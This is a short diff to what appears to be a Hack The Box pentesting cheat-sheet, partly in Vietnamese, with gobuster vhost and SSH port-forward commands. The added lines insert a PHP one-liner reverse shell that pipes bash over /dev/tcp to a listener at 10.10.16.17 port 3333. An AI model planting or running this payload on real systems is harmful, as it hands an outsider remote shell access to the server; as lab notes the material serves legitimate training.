@@ -29,6 +29,12 @@ gobuster vhost -u http://soulmate.htb/ -w /usr/share/wordlists/seclists/Discover
 ssh -L 3000:127.0.0.1:3000 axel@cat.htb
 ```
 
+
+# Reverse Shell
+```
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.17/3333 0>&1'"); ?>
+
+```
 # Leak File từ Target
 
 ```
